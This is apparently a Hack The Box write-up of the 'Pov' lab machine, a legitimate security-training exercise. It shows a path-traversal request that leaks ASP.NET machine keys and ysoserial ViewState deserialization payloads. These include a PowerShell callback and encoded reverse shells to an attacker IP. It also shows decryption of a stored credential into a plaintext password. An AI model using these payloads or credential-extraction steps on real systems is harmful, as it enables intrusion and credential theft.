# Pov Write-Up - HTB

## Recon

```
Nmap scan report for 10.10.11.251
Host is up (0.054s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 113.20 seconds
```

Interesting. Only port 80 is open:

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: pov.htb
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Enumeration

Going on the webapp, I quickly see:&#x20;

<figure><img src="../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

Adding the vhost to our /etc/hosts file.

<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

I tried fuzzing for both, nothing shows up. So my vision is that we have some internal admin console and we need to get there through some disclosure.

Checked the source code of the main page and we will try to see what goes on with the download cv function, that seems like a good entry point for LFI.

Burp Request:

{% code overflow="wrap" %}
```
POST /portfolio/ HTTP/1.1
Host: dev.pov.htb
Content-Length: 368
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://dev.pov.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://dev.pov.htb/portfolio/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=zKsfYOrZMREyMKbjTKjor1673q9Ea4K%2FwZUezkFyaOYRBX7mIRLwlha89Q4r%2BJfXB3QqEj01mq0xP6ir5oT63ZMa3JI%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=F6BkBQ2lWYBZwt3E9cG2Axj48J%2FPadcriv%2BLRFWO%2FDY36kIpeerTS%2Fj3l2FwH7BIbVLUoUw0c06hT5bg38oXmp1BJG3gbC%2FabW7k0rgaVeMS90WCVQAXaYfB6gb3lfc8ikqbeg%3D%3D&file=..\web.config
```
{% endcode %}

Interesting response, it discloses both keys. Deserialization is the name of the game:

<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

This[ one](https://book.hacktricks.wiki/en/pentesting-web/deserialization/exploiting-__viewstate-parameter.html) gives us a good explanation for this.&#x20;

Crafting the following payload:&#x20;

{% code overflow="wrap" %}
```
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://10.10.16.8:9090/$env:UserName" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
```
{% endcode %}

Running a python server on 9090 and waiting for a request.

<figure><img src="../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

Sweet. Now let's get reverse shell.&#x20;

I listen with nc over 4444 and craft the following payload:

{% code overflow="wrap" %}
```
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AOAAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

I ran a few commands like netstat -ano and get users to see what goes on around and could find:

```
Get-ChildItem -Path C:\Users\sfitz\ -Recurse -Include *.txt,*.xml,*.config,*.ini -ErrorAction SilentlyContinue
```

<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

I tried using this file to get alaading, but no luck:

```
PS C:\Users\sfitz\Documents> $cred = Import-Clixml -Path C:\Users\sfitz\Documents\connection.xml
PS C:\Users\sfitz\Documents> Start-Process powershell -Credential $cred -ArgumentList "-Command New-PSSession -ComputerName localhost; whoami"
PS C:\Users\sfitz\Documents> $session = New-PSSession -Credential $cred
PS C:\Users\sfitz\Documents> Enter-PSSession $session


PS C:\Users\sfitz\Documents> PS C:\Users\sfitz\Documents> whoami
pov\sfitz
```

So I chose to extract it:

```
PS C:\Users\sfitz\Documents> $cred = Import-Clixml -Path C:\Users\sfitz\Documents\connection.xml
PS C:\Users\sfitz\Documents> $cred.GetNetworkCredential().Password
f8gQ8fynP44ek1m3
```

Tried using it to open PS, but no luck:

```
PS C:\Users\sfitz\Documents> $securePassword = ConvertTo-SecureString "f8gQ8fynP44ek1m3" -AsPlainText -Force
PS C:\Users\sfitz\Documents> $credential = New-Object System.Management.Automation.PSCredential("alaading", $securePassword)
PS C:\Users\sfitz\Documents> $session = New-PSSession -Credential $credential
PS C:\Users\sfitz\Documents> Enter-PSSession $session
```

Though this works:

```
$securePassword = ConvertTo-SecureString "f8gQ8fynP44ek1m3" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential("alaading", $securePassword)
Invoke-Command -Credential $credential -ComputerName localhost -ScriptBlock { whoami }
pov\alaading
```

Got a reverse shell:

{% code overflow="wrap" %}
```
Invoke-Command -Credential $credential -ComputerName localhost -ScriptBlock {powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AOAAiACwANQA1ADUANQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=}
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

